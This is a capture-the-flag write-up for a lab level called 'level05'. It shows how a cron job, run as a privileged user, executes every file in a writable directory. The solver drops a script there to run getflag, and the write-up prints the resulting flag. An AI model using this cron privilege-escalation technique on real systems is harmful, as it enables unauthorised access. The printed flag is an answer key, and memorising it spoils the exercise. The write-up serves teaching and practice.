# level05

We log in as `level05` and we see a message :

```
You have new mail.
```

A quick Google search tells us where to look : typically, Linux emails are in `/var/mail` or `/var/spool`. We find a file, `/var/mail/level05`. It contains a single line :

```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

What is this ? This is the format of a **cron job**. Cron allows you to run tasks periodically.

`*/2 * * * *` tells us it runs every 2 minutes (see [crontab guru](https://crontab.guru/#*/2_*_*_*_*), a very useful tool) the command `sh /usr/sbin/openarenaserver`. The bit at the end suggests the job is ran by `flag05` - exactly what we need to exploit !

We take a look at the scheduled shell script, `/usr/sbin/openarenaserver` :

```
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

The script appears to run every file in the `/opt/openarenaserver`, directory with `bash -x <FILENAME>`.

All we need to do is write a script to run getflag for us. We run :

```
echo 'getflag > /tmp/flag05.txt' > /opt/openarenaserver/script
```

Two minutes later, cron has ran the job, and we can read the level05 flag with `cat /tmp/flag05.txt` :

```
viuaaale9huek52boumoomioc
```